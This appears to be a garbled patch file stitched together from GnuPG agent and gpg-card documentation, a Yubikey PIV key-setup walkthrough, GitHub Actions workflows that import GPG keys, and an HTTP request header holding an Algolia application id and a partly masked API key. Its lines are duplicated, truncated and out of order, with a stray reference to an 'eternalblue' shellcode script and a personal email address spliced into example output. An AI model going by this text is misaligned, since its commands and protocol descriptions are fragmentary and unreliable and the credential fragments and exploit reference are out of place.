++     (public-key
++       (rsa
++   (n <mpi>)
++   (e <mpi>)))
++Here is an example session:
++
++   C: GENKEY
++   S: INQUIRE KEYPARM
++   C: D (genkey (rsa (nbits  1024)))
++   C: END
++   S: D (public-key
++   S: D   (rsa (n 326487324683264) (e 10001)))
++   S  OK key created
++    ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81>
++LISTTRUSTED
++GpgAgent returns a list of trusted keys line by line:
++
++    S: D 000000001234454556565656677878AF2F1ECCFF P
++    S: D 340387563485634856435645634856438576457A P
++    S: D FEDC6532453745367FD83474357495743757435D S
++    S: OK
++The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future.
++Ok
++Finally a client should be able to mark a key as trusted:
++
++   MARKTRUSTED fingerprint "P"|"S"
++The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:
++
++   S: INQUIRE TRUSTDESC
++   C: D Do you trust the key with the fingerprint @FPR@
++   C: D bla fasel blurb.
++   C: END
++   S: OK
++GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]] \
++                 [--qualitybar] cache_id                \
++                 [error_message prompt description]
++PRESET_PASSPHRASE [--inquire] <string_or_keygrip> <timeout> [<hexstring>]
++
++HAVEKEY keygrips
++  GET_CONFIRMATION description
++  LEARN [--send]
++UPDATESTARTUPTTY
++SETDATA hexstring
++
++
++  PKSIGN keyid
++
++
++  PKSIGN --hash=algoname keyid
++
++READCERT hexified_certid|keyid
++READKEY hexified_certid
++SETDATA hexstring
++d
++
++  PKSIGN keyid
++ LEARN
++
++  PKSIGN --hash=algoname keyid
++
++WRITEKEY [--force] keyid
++WRITEKEY [--force] keyid
++PASSWD [--reset] [--nullpin] chvno
++CHECKPIN idstr
++APDU [--atr] [--more] [--exlen[=n]] [hexstring]
++this:
++
++     S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
++--auto-key-import 
++
++command --locate-external-key
++command --locate-external-key
++github/workflows/release.yml:
++ldap://keys.(thedomain)
++‘--auto-key-locate
++ --auto-key-locate
++--auto-key-retrieve
++
++
++ honor-keyserver-url 
++
++-sig-keyserver-url
++--recv-key
++honor-keyserver-url
++--use-agent
++--gpg-agent-info
++
++
++--no-random-seed-file
++Host: c7-use-3.algolianet. com
++Accept: */*
++Sec-Fetch-Site: cross-site
++Accept-Language: en-US, en; q=0.9
++Accept-Encoding: gzip, deflate, br
++Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B
++Origin: https://dashboard.algolia.com
++User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe
++x-algolia-api-key: b3cf*************************米**
++Content-Length: 27
++Connection: keep-alive
++Content-Type: application/x-www-form-urlencoded
++Sec-Fetch-Dest: empty
++
++scdaemon.conf
++1
++HKCU\Software\GNU\GnuPG:DefaultLogFile,
++--debug-level level
++HKCU\Software\GNU\GnuPG:DefaultLogFile,
++scd-event
++HKCU\Software\GNU\GnuPG:HomeDir
++HKCU\Software\GNU\GnuPG:DefaultLogFile,
++reader_n.status
++HKCU\Software\GNU\GnuPG:HomeDir
++
++trustlist.txt file
++gpg-agent.conf
++HKCU\Software\GNU\GnuPG:HomeDir
++name: release
++debug-pinentry 
++--debug 1024
++
++global trustlist (/usr/local/etc/gnupg/trustlist.tx
++
++Active cards
++Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers.
++gpg-connect-agent updatestartuptty /bye
++Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command:
++
++gpg-connect-agent /bye
++--scdaemon-program filename
++Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf
++--check-passphrase-pattern file
++--check-sym-passphrase-pattern file
++Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg)
++bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe
++Keys listed in the sshcontrol file
++--disable-extended-key-format
++These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched.
++
++--enable-ssh-support
++--enable-win32-openssh-support
++--enable-putty-support
++
++gpg-connect-agent 'GETINFO s2k_count' /bye
++gpg-connect-agent 'GETINFO s2k_time' /bye
++To view the auto-calibrated count use:
++
++gpg-connect-agent 'GETINFO s2k_count_cal' /bye
++--ssh-fingerprint-digest
++Keys listed in the sshcontrol file
++
++Active card
++gpg-connect-agent /bye
++bashrc or whatever initialization file is used for all shell invocations:
++
++GPG_TTY=$(tty)
++export GPG_TTY
++--daemon [command line]
++server
++
++agent-program file ¶
++Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs.
++
++--gpg-program file
++Specify a non-default gpg binary to be used by certain commands.
++
++--gpgsm-program file
++Specify a non-default gpgsm binary to be used by certain commands.
++
++--chuid uid
++Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows.
++
++gpg-card
++AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶
++AUTH
++FETCH
++GENERATE [--force] [--algo=algo{+algo2}] keyref
++KDF-SETUP ¶
++Prepare the OpenPGP card KDF feature for this card.
++
++LANG [--clear]
++Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info.
++
++LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app]
++NAME [--clear]
++PRIVATEDO [--clear] n [< file] file
++READCERT [--openpgp] certref > file ¶
++Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3".
++URL [--clear]
++gpg's. --fetch 
++WRITECERT certref < file ¶
++WRITECERT --openpgp certref [< file|fpr]
++WRITECERT --clear certref
++ --openpgp
++file 
++fpr.
++WRITEKEY [--force] keyref keygrip ¶
++Write a private key object identified by keygrip to the card under the id keyref.
++CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶
++Serial number
++A hex-string with the serial number of the card.
++
++Type
++This gives the type of the card’s application. For example "OpenPGP" or "PIV".
++
++Keygrip
++A hex-string identifying a key.
++
++Keyref
++The application slot where the key is stored on the card. For example "OpenPGP.1"
++
++Status
++The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card.
++
++YUBIKEY cmd args
++Various commands pertaining to Yubikey tokens with cmd being:
++
++LIST
++List supported and enabled Yubikey applications.
++
++ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all]
++DISABLE
++Enable or disable the specified or all applications on the given interface.
++
++The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit.
++
++GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are:
++
++Authentication key
++This is a 24 byte key described by the hex string
++010203040506070801020304050607080102030405060708.
++
++PIV Application PIN
++This is the string 123456.
++
++PIN Unblocking Key
++This is the string 12345678.
++list (the string gpg/card>
++card> list
++Reader ...........: 1050:0407:X:0
++Card type ........: yubikey
++Card firmware ....: 5.1.2
++Serial number ....: D2760001240102010006090746250000
++Application type .: OpenPGP
++Version ..........: 2.1
++[...]
++on:
++  push:
++    tags:
++      - "v*"
++
++permissions:
++  contents: write
++
++jobs:
++  release:
++    runs-on: ubuntu-latest
++    steps:
++      - uses: actions/checkout@v3
++      - uses: cli/gh-extension-precompile@v1
++        with:
++          go_version: "1.16"
++Then
++- uses: cli/gh-extension-precompile@v1
++  env:
++    CGO_ENABLED: 1
++- uses: cli/gh-extension-precompile@v1
++  with:
++    build_script_override: "script/build.sh"
++name: release
++
++on:
++  push:
++    tags:
++      - "v*"
++
++permissions:
++  contents: write
++
++jobs:
++  release:
++    runs-on: ubuntu-latest
++    steps:
++      - uses: actions/checkout@v3
++      - id: import_gpg
++        uses: crazy-max/ghaction-import-gpg@v5
++        with:
++          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
++          passphrase: ${{ secrets.GPG_PASSPHRASE }}
++      - uses: cli/gh-extension-precompile@v1
++        with:
++          gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}
++# macOS
++gpg --armor --export-secret-key joe@foo.bar | pbcopy
++
++# Ubuntu (assuming GNU base64)
++gpg --armor --export-secret-key joe@foo.bar -w0 | xclip
++
++# Arch
++gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i
++
++# FreeBSD (assuming BSD base64)
++gpg --armor --export-secret-key joe@foo.bar | xclip
++
++name: import-gpg
++
++on:
++  push:
++    branches: master
++
++jobs:
++  import-gpg:
++    runs-on: ubuntu-latest
++    steps:
++      -
++        name: Checkout
++        uses: actions/checkout@v4
++      -
++        name: Import GPG key
++        uses: crazy-max/ghaction-import-gpg@v6
++        with:
++          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
++          passphrase: ${{ secrets.PASSPHRASE }}
++      -
++        name: List keys
++        run: gpg -K
++name: import-gpg
++
++on:
++  push:
++    branches: master
+ 
++gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
++gpg/card> writecert PIV.9D < encr.crt
++
++jobs:
++  import-gpg:
++    runs-on: ubuntu-latest
++    steps:
++      -
++        name: Checkout
++        uses: actions/checkout@v4
++      -
++        name: Import GPG key
++        uses: crazy-max/ghaction-import-gpg@v6
++        with:
++          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
++          passphrase: ${{ secrets.PASSPHRASE }}
++          fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8"
++      -
++        name: List keys
++        run: gpg -K
++
++pub   ed25519 2021-09-24 [C]
++      87F257B89CE462100BEC0FFE6071D218380FDCC8
++      Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092
++uid           [ unknown] Joe Bar <joe@bar.foo>
++sub   ed25519 2021-09-24 [S]
++      C17D11ADF199F12A30A0910F1F80449BE0B08CB8
++      Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB
++name: import-gpg
++/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add
++
++application-priority piv
++to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens.
++
++With one of these methods employed the list command of gpg-card shows this:
++
++gpg/card> list
++Reader ...........: 1050:0407:X:0
++Card type ........: yubikey
++Card firmware ....: 5.1.2
++Serial number ....: FF020001008A77C1
++Application type .: PIV
++Version ..........: 1.0
++Displayed s/n ....: yk-9074625
++PIN usage policy .: app-pin
++PIN retry counter : - 3 -
++PIV authentication: [none]
++      keyref .....: PIV.9A
++Card authenticat. : [none]
++      keyref .....: PIV.9E
++Digital signature : [none]
++      keyref .....: PIV.9C
++Key management ...: [none]
++      keyref .....: PIV.9D
++34798AAFE0A7565088101CC4AE31C5C8C74461CB.key
++list --cards
++well. The PIV authentication key (internal reference PIV.9A
++Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption
++
++gpg/card> auth 010203040506070801020304050607080102030405060708
++gpg/card> auth < myauth.key
++
++gpg/card> generate --algo=nistp384 PIV.9A
++PIV card no. yk-9074625 detected
++gpg/card> generate --algo=nistp256 PIV.9E
++PIV card no. yk-9074625 detected
++gpg/card> generate --algo=rsa2048 PIV.9C
++PIV card no. yk-9074625 detected
++ ‘--force’
++gpg/card> list
++Reader ...........: 1050:0407:X:0
++Card type ........: yubikey
++Card firmware ....: 5.1.2
++Serial number ....: FF020001008A77C1
++Application type .: PIV
++Version ..........: 1.0
++Displayed s/n ....: yk-9074625
++PIN usage policy .: app-pin
++PIN retry counter : - 3 -
++PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
++      keyref .....: PIV.9A  (auth)
++      algorithm ..: nistp384
++Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
++      keyref .....: PIV.9E  (auth)
++      algorithm ..: nistp256
++Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
++      keyref .....: PIV.9C  (sign,cert)
++      algorithm ..: rsa2048
++Key management ...: [none]
++      keyref .....: PIV.9D
++keygrip
++gpg
++self-signed X.509 certificate (exit the gpg-card tool, first):
++
++$ gpgsm --gen-key -o encr.crt
++   (1) RSA
++   (2) Existing key
++   (3) Existing key from card
++Your selection? 1
++What keysize do you want? (3072) 2048
++Requested keysize is 2048 bits
++Possible actions for a RSA key:
++   (1) sign, encrypt
++   (2) sign
++   (3) encrypt
++Your selection? 3
++Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
++Enter email addresses (end with an empty line):
++> otto@example.net
++>
++Enter DNS names (optional; end with an empty line):
++>
++Enter URIs (optional; end with an empty line):
++>
++Create self-signed certificate? (y/N) y
++These parameters are used:
++    Key-Type: RSA
++    Key-Length: 2048
++    Key-Usage: encrypt
++    Serial: random
++    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
++    Name-Email: otto@example.net
++
++Proceed with creation? (y/N)
++Now creating self-signed certificate.  This may take a while ...
++gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
++gpgsm: certificate created
++Ready.
++$ gpgsm --import encr.crt
++gpgsm: certificate imported
++gpgsm: total number processed: 1
++gpgsm:               imported: 1
++gpg/card> list
++Reader ...........: 1050:0407:X:0
++Card type ........: yubikey
++Card firmware ....: 5.1.2
++Serial number ....: FF020001008A77C1
++Application type .: PIV
++Version ..........: 1.0
++Displayed s/n ....: yk-9074625
++PIN usage policy .: app-pin
++PIN retry counter : - 3 -
++PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
++      keyref .....: PIV.9A  (auth)
++      algorithm ..: nistp384
++Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
++      keyref .....: PIV.9E  (auth)
++      algorithm ..: nistp256
++Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
++      keyref .....: PIV.9C  (sign,cert)
++      algorithm ..: rsa2048
++Key management ...: [none]
++      keyref .....: PIV.9D
++keygrip 
++gpgsm --gen-key -o encr.crt
++   (1) RSA
++   (2) Existing key
++   (3) Existing key from card
++Your selection? 1
++What keysize do you want? (3072) 2048
++Requested keysize is 2048 bits
++Possible actions for a RSA key:
++   (1) sign, encrypt
++   (2) sign
++   (3) encrypt
++Your selection? 3
++Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
++Enter email addresses (end with an empty line):
++> otto@example.net
++>
++Enter DNS names (optional; end with an empty line):
++>
++Enter URIs (optional; end with an empty line):
++>
++Create self-signed certificate? (y/N) y
++These parameters are used:
++    Key-Type: RSA
++    Key-Length: 2048
++    Key-Usage: encrypt
++    Serial: random
++    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
++    Name-Email: otto@example.net
++
++Proceed with creation? (y/N)
++Now creating self-signed certificate.  This may take a while ...
++gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
++gpgsm: certificate created
++Ready.
++$ gpgsm --import encr.crt
++gpgsm: certificate imported
++gpgsm: total number processed: 1
++gpgsm:               imported: 1
++
++gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
++gpg/card> writecert PIV.9D < encr.crt
++
++gpgsm --with-keygrip -k 6309304695z@gmail.com
++Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
++      keyref .....: PIV.9D  (encr)
++      algorithm ..: rsa2048
++      used for ...: X.509
++        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
++        user id ..: <6309304695z@gmail.com>
++
++34798AAFE0A7565088101CC4AE31C5C8C74461CB.key
++
++$ gpgsm --learn
++$ gpgsm --gen-key -o sign.crt
++Please select what kind of key you want:
++   (1) RSA
++   (2) Existing key
++   (3) Existing key from card
++Your selection? 3
++Serial number of the card: FF020001008A77C1
++Available keys:
++   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
++   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
++   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
++   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048
++Your selection? 3
++Possible actions for a RSA key:
++   (1) sign, encrypt
++   (2) sign
++   (3) encrypt
++Your selection? 2
++Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE
++Enter email addresses (end with an empty line):
++> 6309304695z@gmail.com
++>
++Enter DNS names (optional; end with an empty line):
++>
++Enter URIs (optional; end with an empty line):
++>
++Create self-signed certificate? (y/N)
++These parameters are used:
++    Key-Type: card:PIV.9C
++    Key-Length: 1024
++    Key-Usage: sign
++    Serial: random
++    Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
++    Name-Email: 6309304695z@gmail.com
++
++Proceed with creation? (y/N) y
++Now creating self-signed certificate.  This may take a while ...
++gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED
++gpgsm: certificate created
++Ready.
++$ gpgsm --import sign.crt
++gpgsm: certificate imported
++gpgsm: total number processed: 1
++gpgsm:               imported: 1
++
++‘gpgsm --learn’
++Digital signature’ key
++gpg-card:010203040506070801020304050607080102030405060708
++
++shellcode/eternalblue_sc_merge.py
++
++gpg/card> writecert PIV.9C < sign.crt
+ on:
+   push:
+     branches: master
+
+AUTHENTICATE [--setkey] [--raw] [< file]|key]
+AUTH and set key
+
+GENERATE [--force] [--algo=algo{+algo2}] keyref
+Create a new key on a card. Use --force to overwrite an existing key. Use "help" for algo to get a list of known algorithms. For OpenPGP cards several algos may be given. Note that the OpenPGP key generation is done interactively unless --algo or keyref
+
+LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ¶
+L
+
+READCERT [--openpgp] certref > file ¶
+
+openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3"
+
+WRITECERT certref < file ¶
+WRITECERT --openpgp certref [< file|fpr]
+WRITECERT --clear certref
+Write a certificate to the card under the id certref. 
+
+WRITEKEY [--force] keyref keygrip ¶
+Write a private key object identified by keygrip to the card under the id keyref. Option --force allows overwriting an existing key
+—Shadowed
+
+YUBIKEY cmd args ¶
+Various commands pertaining to Yubikey tokens with cmd being:
+
+LIST
+List supported and enabled Yubikey applications.
+
+ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all]
+DISABLE
+Enable or disable the specified or all applications on the given interface.
+
+Authentication key
+This is a 24 byte key described by the hex string
+010203040506070801020304050607080102030405060708.
+
+PIV
+
+Authentication key
+This is a 24 byte key described by the hex string
+010203040506070801020304050607080102030405060708
+
+the string gpg/card> is the prompt
+
+gpg/card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: D2760001240102010006090746250000
+Application type .: OpenPGP
+Version ..........: 2.1
+[...]
+
+use help yubikey).
+
+use help yubikey)
+
+gpg/card> yubikey disable all opgp
+gpg/card> yubikey list
+Application  USB    NFC
+-----------------------
+OTP          yes    yes
+U2F          yes    yes
+OPGP         no     no
+PIV          yes    no
+OATH         yes    yes
+FIDO2        yes    yes
+gpg/card> reset
+
+/.gnupg/scdaemon.conf
+
+application-priority piv
+
+scdaemon
+
+gpg/card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - 3 -
+PIV authentication: [none]
+      keyref .....: PIV.9A
+Card authenticat. : [none]
+      keyref .....: PIV.9E
+Digital signature : [none]
+      keyref .....: PIV.9C
+Key management ...: [none]
+      keyref .....: PIV.9D
+In
+
+Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D)
+
+Card authentication key; however, that key is mandatory by the PIV standard and thus we create it too. Key generation requires that we authenticate to the card. This can be done either on the command line (which would reveal the key):
+
+gpg/card> auth 010203040506070801020304050607080102030405060708
+
+gpg/card> auth < myauth.key
+
+gpg/card> generate --algo=nistp384 PIV.9A
+PIV card no. yk-9074625 detected
+gpg/card> generate --algo=nistp256 PIV.9E
+PIV card no. yk-9074625 detected
+gpg/card> generate --algo=rsa2048 PIV.9C
+PIV card no. yk-9074625 detected
+
+gpg/card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - 3 -
+PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
+      keyref .....: PIV.9A  (auth)
+      algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
+      keyref .....: PIV.9E  (auth)
+      algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
+      keyref .....: PIV.9C  (sign,cert)
+      algorithm ..: rsa2048
+Key management ...: [none]
+      keyref .....: PIV.9D 
+—force
+
+$ gpgsm --gen-key -o encr.crt
+   (1) RSA
+   (2) Existing key
+   (3) Existing key from card
+Your selection? 1
+What keysize do you want? (3072) 2048
+Requested keysize is 2048 bits
+Possible actions for a RSA key:
+   (1) sign, encrypt
+   (2) sign
+   (3) encrypt
+Your selection? 3
+Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
+Enter email addresses (end with an empty line):
+> otto@example.net
+>
+Enter DNS names (optional; end with an empty line):
+>
+Enter URIs (optional; end with an empty line):
+>
+Create self-signed certificate? (y/N) y
+These parameters are used:
+    Key-Type: RSA
+    Key-Length: 2048
+    Key-Usage: encrypt
+    Serial: random
+    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
+    Name-Email: otto@example.net
+
+Proceed with creation? (y/N)
+Now creating self-signed certificate.  This may take a while ...
+gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpgsm: certificate created
+Ready.
+$ gpgsm --import encr.crt
+gpgsm: certificate imported
+gpgsm: total number processed: 1
+gpgsm:               imported: 1
+
+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpg/card> writecert PIV.9D < encr.crt
+
+[...]
+Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+      keyref .....: PIV.9D  (encr)
+      algorithm ..: rsa2048
+      used for ...: X.509
+        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
+        user id ..: <otto@example.net>
+
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key from the directory ~/.gnupg/private-keys-v1.d/
+
+$ gpgsm --learn
+$ gpgsm --gen-key -o sign.crt
+Please select what kind of key you want:
+   (1) RSA
+   (2) Existing key
+   (3) Existing key from card
+Your selection? 3
+Serial number of the card: FF020001008A77C1
+Available keys:
+   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
+   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
+   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
+   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048
+Your selection? 3
+Possible actions for a RSA key:
+   (1) sign, encrypt
+   (2) sign
+   (3) encrypt
+Your selection? 2
+Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE
+Enter email addresses (end with an empty line):
+> otto@example.net
+>
+Enter DNS names (optional; end with an empty line):
+>
+Enter URIs (optional; end with an empty line):
+>
+Create self-signed certificate? (y/N)
+These parameters are used:
+    Key-Type: card:PIV.9C
+    Key-Length: 1024
+    Key-Usage: sign
+    Serial: random
+    Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
+    Name-Email: otto@example.net
+
+Proceed with creation? (y/N) y
+Now creating self-signed certificate.  This may take a while ...
+gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED
+gpgsm: certificate created
+Ready.
+$ gpgsm --import sign.crt
+gpgsm: certificate imported
+gpgsm: total number processed: 1
+gpgsm:               imported: 1
+
+gpg/card> writecert PIV.9C < sign.crt
+
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - [verified] -
+PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
+      keyref .....: PIV.9A  (auth)
+      algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
+      keyref .....: PIV.9E  (auth)
+      algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
+      keyref .....: PIV.9C  (sign,cert)
+      algorithm ..: rsa2048
+      used for ...: X.509
+        user id ..: CN=Signing key for yk-9074625,O=example,C=DE
+        user id ..: <otto@example.net>
+Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+      keyref .....: PIV.9D  (encr)
+      algorithm ..: rsa2048
+      used for ...: X.509
+        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
+        user id ..: <otto@example.net>
+
+PIV authentication’ key with ssh:
+
+$ ssh-add -l
+384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA)
+
+$ gpgsm --learn
+$ gpg --full-gen-key
+Please select what kind of key you want:
+   (1) RSA and RSA (default)
+   (2) DSA and Elgamal
+   (3) DSA (sign only)
+   (4) RSA (sign only)
+  (14) Existing key from card
+Your selection? 14
+Serial number of the card: FF020001008A77C1
+Available keys:
+   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
+   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
+   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
+   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
+Your selection? 3
+Please specify how long the key should be valid.
+         0 = key does not expire
+      <n>  = key expires in n days
+      <n>w = key expires in n weeks
+      <n>m = key expires in n months
+      <n>y = key expires in n years
+Key is valid for? (0)
+Key does not expire at all
+Is this correct? (y/N) y
+
+GnuPG needs to construct a user ID to identify your key.
+
+Real name:
+Email address: otto@example.net
+Comment:
+You selected this USER-ID:
+    "otto@example.net"
+
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o
+gpg: key C3AFA9ED971BB365 marked as ultimately trusted
+gpg: revocation certificate stored as '[...]D971BB365.rev'
+public and secret key created and signed.
+
+Note that this key cannot be used for encryption.  You may want to use
+the command "--edit-key" to generate a subkey for this purpose.
+pub   rsa2048 2019-04-04 [SC]
+      7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+uid                      otto@example.net
+$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+Secret key is available.
+
+sec  rsa2048/C3AFA9ED971BB365
+     created: 2019-04-04  expires: never       usage: SC
+     card-no: FF020001008A77C1
+     trust: ultimate      validity: ultimate
+[ultimate] (1). otto@example.net
+gpg> addkey
+Secret parts of primary key are stored on-card.
+Please select what kind of key you want:
+   (3) DSA (sign only)
+   (4) RSA (sign only)
+   (5) Elgamal (encrypt only)
+   (6) RSA (encrypt only)
+  (14) Existing key from card
+Your selection? 14
+Serial number of the card: FF020001008A77C1
+Available keys:
+   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
+   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
